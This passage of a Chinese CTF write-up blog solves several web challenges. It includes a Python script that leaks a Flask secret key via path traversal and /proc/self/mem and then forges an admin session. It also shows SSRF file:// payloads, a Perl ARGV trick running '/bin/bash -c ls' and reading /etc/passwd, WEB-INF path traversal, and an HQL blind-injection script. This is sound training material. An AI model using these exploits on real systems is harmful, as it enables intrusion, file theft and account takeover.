class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#Edited by lx56@blog.lxscloud.top</span></span><br><span class="line"><span class="comment">###################################</span></span><br><span class="line"><span class="comment">#----------------------------------</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> ast, sys</span><br><span class="line"><span class="keyword">from</span> abc <span class="keyword">import</span> ABC</span><br><span class="line"><span class="keyword">from</span> flask.sessions <span class="keyword">import</span> SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:60014/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此程序只能运行于Python3以上</span></span><br><span class="line"><span class="keyword">if</span> sys.version_info[<span class="number">0</span>] &lt; <span class="number">3</span>: <span class="comment"># &lt; 3.0</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Must be using at least Python 3&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#----------------session 伪造,单独用也可以考虑这个库： https://github.com/noraj/flask-session-cookie-manager ----------------</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MockApp</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, secret_key</span>):</span><br><span class="line">        self.secret_key = secret_key</span><br><span class="line">        </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FSCM</span>(<span class="title class_ inherited__">ABC</span>):</span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">secret_key, session_cookie_structure</span>):</span><br><span class="line">            <span class="comment">#Encode a Flask session cookie</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                app = MockApp(secret_key)</span><br><span class="line"></span><br><span class="line">                session_cookie_structure = <span class="built_in">dict</span>(ast.literal_eval(session_cookie_structure))</span><br><span class="line">                si = SecureCookieSessionInterface()</span><br><span class="line">                s = si.get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> s.dumps(session_cookie_structure)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;[Encoding error] &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e)</span><br><span class="line">                <span class="keyword">raise</span> e</span><br><span class="line"><span class="comment">#-------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#由/proc/self/maps获取可读写的内存地址，再根据这些地址读取/proc/self/mem来获取secret key</span></span><br><span class="line">s_key = <span class="string">&quot;&quot;</span></span><br><span class="line">bypass = <span class="string">&quot;../..&quot;</span></span><br><span class="line"><span class="comment">#请求file路由进行读取</span></span><br><span class="line">map_list = requests.get(url + <span class="string">f&quot;info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/maps&quot;</span>)</span><br><span class="line">map_list = map_list.text.split(<span class="string">&quot;\\n&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> map_list:</span><br><span class="line">    <span class="comment">#匹配指定格式的地址</span></span><br><span class="line">    map_addr = re.<span class="keyword">match</span>(<span class="string">r&quot;([a-z0-9]+)-([a-z0-9]+) rw&quot;</span>, i)</span><br><span class="line">    <span class="keyword">if</span> map_addr:</span><br><span class="line">        start = <span class="built_in">int</span>(map_addr.group(<span class="number">1</span>), <span class="number">16</span>)</span><br><span class="line">        end = <span class="built_in">int</span>(map_addr.group(<span class="number">2</span>), <span class="number">16</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Found rw addr:&quot;</span>, start, <span class="string">&quot;-&quot;</span>, end)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#设置起始和结束位置并读取/proc/self/mem</span></span><br><span class="line">        res = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>/info?file=<span class="subst">&#123;bypass&#125;</span>/proc/self/mem&amp;start=<span class="subst">&#123;start&#125;</span>&amp;end=<span class="subst">&#123;end&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="comment">#用到了之前特定的SECRET_KEY格式。如果发现*abcdefgh存在其中，说明成功泄露secretkey</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;*abcdefgh&quot;</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            <span class="comment">#正则匹配，本题secret key格式为32个小写字母或数字，再加上*abcdefgh</span></span><br><span class="line">            secret_key = re.findall(<span class="string">&quot;[a-z0-9]&#123;32&#125;\*abcdefgh&quot;</span>, res.text)</span><br><span class="line">            <span class="keyword">if</span> secret_key:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Secret Key:&quot;</span>, secret_key[<span class="number">0</span>])</span><br><span class="line">                s_key = secret_key[<span class="number">0</span>]</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#设置session中admin的值为1</span></span><br><span class="line">data = <span class="string">&#x27;&#123;&quot;admin&quot;:1&#125;&#x27;</span></span><br><span class="line"><span class="comment">#伪造session</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span> : <span class="string">&quot;session=&quot;</span> + FSCM.encode(s_key, data)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#请求admin路由</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    flag = requests.get(url + <span class="string">&quot;admin&quot;</span>, headers=headers)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Flag is&quot;</span>, flag.text)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Something error&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h2 id="53-题目名称-SSRF-Me"><a href="#53-题目名称-SSRF-Me" class="headerlink" title="53.题目名称-SSRF Me"></a>53.题目名称-SSRF Me</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122223448390.png" alt="image-20230122223448390"></p>
<p>md5截断，验证码大多都为数字，所有可以进行爆破</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">1000000000</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">       <span class="variable">$a</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>), -<span class="number">6</span>, <span class="number">6</span>);<span class="keyword">if</span> (<span class="variable">$a</span> == <span class="string">&quot;49f6ef&quot;</span>) &#123;<span class="keyword">echo</span> <span class="variable">$i</span>; <span class="keyword">break</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122223725291.png" alt="image-20230122223725291"></p>
<p>发现file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd可以</p>
<p>file:&#x2F;&#x2F;&#x2F;flag不行</p>
<p>所以使用url编码绕过</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122223818618.png" alt="image-20230122223818618"></p>
<p>在web界面输入<br>file:&#x2F;&#x2F;&#x2F;%66%6c%61%67<br>拿到flag<br>如果是使用的burpsuit记得二次url编码</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122225032797.png" alt="image-20230122225032797"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122225039166.png" alt="image-20230122225039166"></p>
<h2 id="54-i-got-id-200"><a href="#54-i-got-id-200" class="headerlink" title="54.i-got-id-200"></a>54.i-got-id-200</h2><p>打开</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122225316051.png" alt="image-20230122225316051"></p>
<p>都点一下</p>
<p>发现files页面可以上传文件</p>
<p> 上传一个文件</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122225651251.png" alt="image-20230122225651251"></p>
<p>把上传文件内容显示出来</p>
<p>简单学习了下perl的上传，猜测可能后台为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">my $cgi= CGI-&gt;new;</span><br><span class="line">if ( $cgi-&gt;upload( &#x27;file&#x27; ) )</span><br><span class="line">&#123;</span><br><span class="line">my $file= $cgi-&gt;param( &#x27;file&#x27; );</span><br><span class="line">while ( &lt;$file&gt; ) &#123; print &quot;$_&quot;; &#125; &#125;</span><br></pre></td></tr></table></figure>

<p>param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。</p>
<p>意ARGV是PERL默认用来接收参数的数组,不管脚本里有没有把它写出来,它始终是存在的。</p>
<p>上传时使用bp进行抓包，将上传的文件类型及文件内容处复制再粘贴一行，将 filename去掉，然后内容填入ARGV，如下图所示</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122230629284.png" alt="image-20230122230629284"></p>
<p>将3部分payload修改 为：&#x2F;cgi­-bin&#x2F;file.pl?&#x2F;etc&#x2F;passwd</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122231922378.png" alt="image-20230122231922378"></p>
<p>利用bash来进行读取当前目录下的文件，将3部分payload修改为：&#x2F;cgi-bin&#x2F;file.pl?&#x2F;bin&#x2F;bash%20-­c%20ls${IFS}&#x2F;| </p>
<p>IFS为shell的字段分隔符，可将字符串按照特性的格式进行分割</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122232609463.png" alt="image-20230122232609463"></p>
<p>读取当前目录的flag文件内容,将3部分payload修改为：&#x2F;cgi­bin&#x2F;file.pl?&#x2F;flag</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230122232705848.png" alt="image-20230122232705848"></p>
<h2 id="55-Zhuanxv"><a href="#55-Zhuanxv" class="headerlink" title="55.Zhuanxv"></a>55.Zhuanxv</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129190116368.png" alt="image-20230129190116368"></p>
<p>题目提示，在扫描端口的时候扫到的这个网页，我们可以对这个网址端口进行扫描</p>
<p><img src="https://img-blog.csdnimg.cn/20200813110807818.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>扫描目录发现了一个list</p>
<p>发现需要登录</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129190712302.png" alt="image-20230129190712302"></p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129190827389.png" alt="image-20230129190827389"></p>
<p>查看源代码是看到一个filename&#x3D;web_login_bg.jpg，在url上输入试试</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129191242225.png" alt="image-20230129191242225"></p>
<p>查看网络数据包</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129191320086.png" alt="image-20230129191320086"></p>
<p>发现coolie中有jesessionid，说明是用java写的网页</p>
<p>那么我们尝试找找web.xml</p>
<p>..&#x2F;..&#x2F;WEB-INF&#x2F;web.xml</p>
<p><img src="https://img-blog.csdnimg.cn/20200813112449202.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>有一个struts2<br>这个是struts的工作原理，以及一些讲解<br>apps-存放了所有Struts2的示例项目</p>
<p>docs-存放了所有Struts2与XWork的文档</p>
<p>lib-存放了所有Struts2相关的JAR文件以及Struts2运行时所依赖的JAR文件</p>
<p>src-存放了所有Struts2的源码，以Maven所指定的项目结构目录存放</p>
<p><img src="https://img-blog.csdnimg.cn/20200813135459882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>读取struts.xml</p>
<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129192304602.png" alt="image-20230129192304602"></p>
<p>这里class里面可以看到很多class类名，尝试了一下，都可以逐个下载，点号换成正斜杠，然后再在后面加个.class就可以下载了，下载后用jd反编译class文件</p>
<p>发现一个看起来和登陆有关的类UserLoginAction,构造payload下载:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?fileName=../../WEB-INF/classes/com/cuitctf/action/UserLoginAction.class</span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200813123105601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>我们将文件下载，并修改为.class文件<br>我们使用luyten反编译</p>
<p><img src="https://img-blog.csdnimg.cn/20200813133946590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.cuitctf.action;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.cuitctf.service.*;</span><br><span class="line"><span class="keyword">import</span> com.cuitctf.po.*;</span><br><span class="line"><span class="keyword">import</span> com.cuitctf.util.*;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.*;</span><br><span class="line"><span class="keyword">import</span> com.opensymphony.xwork2.*;</span><br><span class="line"><span class="keyword">import</span> java.util.regex.*;</span><br><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserLoginAction</span> <span class="keyword">extends</span> <span class="title class_">ActionSupport</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line">    <span class="keyword">private</span> User user;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UserLoginAction</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ApplicationContext</span> <span class="variable">context</span> <span class="operator">=</span> InitApplicationContext.getApplicationContext();</span><br><span class="line">    <span class="built_in">this</span>.userService = (UserService)context.getBean(<span class="string">&quot;userService&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">execute</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;start:&quot;</span> + <span class="built_in">this</span>.user.getName());</span><br><span class="line">    <span class="keyword">final</span> <span class="type">ActionContext</span> <span class="variable">actionContext</span> <span class="operator">=</span> ActionContext.getContext();</span><br><span class="line">    <span class="keyword">final</span> Map&lt;String, Object&gt; request = (Map&lt;String, Object&gt;)actionContext.get(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.userCheck(<span class="built_in">this</span>.user)) &#123;</span><br><span class="line">            request.put(<span class="string">&quot;error&quot;</span>, <span class="string">&quot;\u767b\u5f55\u5931\u8d25\uff0c\u8bf7\u68c0\u67e5\u7528\u6237\u540d\u548c\u5bc6\u7801&quot;</span>);</span><br><span class="line">            System.out.println(<span class="string">&quot;\u767b\u9646\u5931\u8d25&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;login SUCCESS&quot;</span>);</span><br><span class="line">    ActionContext.getContext().getSession().put(<span class="string">&quot;user&quot;</span>, <span class="built_in">this</span>.user);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isValid</span><span class="params">(<span class="keyword">final</span> String username)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">valiidateString</span> <span class="operator">=</span> <span class="string">&quot;[a-zA-Z0-9]&#123;1-16&#125;&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> matcher(valiidateString, username);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">matcher</span><span class="params">(<span class="keyword">final</span> String reg, <span class="keyword">final</span> String string)</span> &#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">tem</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">pattern</span> <span class="operator">=</span> Pattern.compile(reg);</span><br><span class="line">    <span class="keyword">final</span> <span class="type">Matcher</span> <span class="variable">matcher</span> <span class="operator">=</span> pattern.matcher(string);</span><br><span class="line">    tem = matcher.matches();</span><br><span class="line">    <span class="keyword">return</span> tem;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">userCheck</span><span class="params">(<span class="keyword">final</span> User user)</span> &#123;</span><br><span class="line">    <span class="keyword">final</span> List&lt;User&gt; userList = (List&lt;User&gt;)<span class="built_in">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line">    <span class="keyword">if</span> (userList != <span class="literal">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> UserService <span class="title function_">getUserService</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.userService;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUserService</span><span class="params">(<span class="keyword">final</span> UserService userService)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.userService = userService;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> User <span class="title function_">getUser</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.user;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setUser</span><span class="params">(<span class="keyword">final</span> User user)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.user = user;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>截取部分有用的代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">userCheck</span><span class="params">(User user)</span> &#123;</span><br><span class="line">  List&lt;User&gt; userList = <span class="built_in">this</span>.userService.loginCheck(user.getName(), user.getPassword());</span><br><span class="line">  <span class="keyword">if</span> (userList != <span class="literal">null</span> &amp;&amp; userList.size() == <span class="number">1</span>) &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">  addActionError(<span class="string">&quot;Username or password is Wrong, please check!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200813135908263.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>发现还有一个userservicempl的类<br>我们下载</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List &lt;User&gt; loginCheck(String name, String password) &#123;</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot; &quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    name = name.replaceAll(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">username_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(name);</span><br><span class="line">    <span class="type">Matcher</span> <span class="variable">password_matcher</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;^[0-9a-zA-Z]+$&quot;</span>).matcher(password);</span><br><span class="line">    <span class="keyword">if</span> (password_matcher.find()) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.userDao.loginCheck(name, password);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找到登录的规则</p>
<p>是登陆语句的过滤规则,在UserDaoImpl.class中找到:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> List &lt; User &gt; loginCheck(String name, String password) &#123;</span><br><span class="line">       <span class="keyword">return</span> getHibernateTemplate().find(<span class="string">&quot;from User where name =&#x27;&quot;</span> + name + <span class="string">&quot;&#x27; and password = &#x27;&quot;</span> + password + <span class="string">&quot;&#x27;&quot;</span>);  </span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里是大佬的盲注脚本</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s=requests.session()</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">50</span>)</span>:</span><br><span class="line">    p=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> j in <span class="title function_">range</span><span class="params">(<span class="number">1</span>,<span class="number">255</span>)</span>:</span><br><span class="line">  		payload=<span class="string">&quot;(select%0Aascii(substr(id,&quot;</span>+str(i)+<span class="string">&quot;,1))%0Afrom%0AFlag%0Awhere%0Aid&lt;2)&lt;&#x27;&quot;</span>+str(j)+<span class="string">&quot;&#x27;&quot;</span></span><br><span class="line">  		url=<span class="string">&quot;http://111.198.29.45:35732/zhuanxvlogin?user.name=admin&#x27;%0Aor%0A&quot;</span>+payload+<span class="string">&quot;%0Aor%0Aname%0Alike%0A&#x27;admin&amp;user.password=1&quot;</span></span><br><span class="line">  		r1=s.get(url)</span><br><span class="line">  		<span class="keyword">if</span> <span class="title function_">len</span><span class="params">(r1.text)</span>&gt;<span class="number">20000</span> and p!=<span class="string">&#x27;&#x27;</span>:</span><br><span class="line">  			flag+=p</span><br><span class="line">  			print i,flag</span><br><span class="line">  			<span class="keyword">break</span></span><br><span class="line">  		p=chr(j)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://img-blog.csdnimg.cn/20200813140823340.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h2 id="56-wtf-sh-150"><a href="#56-wtf-sh-150" class="headerlink" title="56.wtf.sh-150"></a>56.wtf.sh-150</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230129195210277.png" alt="image-20230129195210277"></p>
<p>随便点击几下发现，网站最后都会进入login和register界面</p>
<p>尝试注入</p>
<p><img src="https://img-blog.csdnimg.cn/20200819132712537.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>并没有发现可以注入</p>
<p><img src="https://img-blog.csdnimg.cn/2020081913280541.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2h4aHhoeGh4eA==,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p>注册发现，admin已经存在，<br>我们看看能不能二次注入</p>
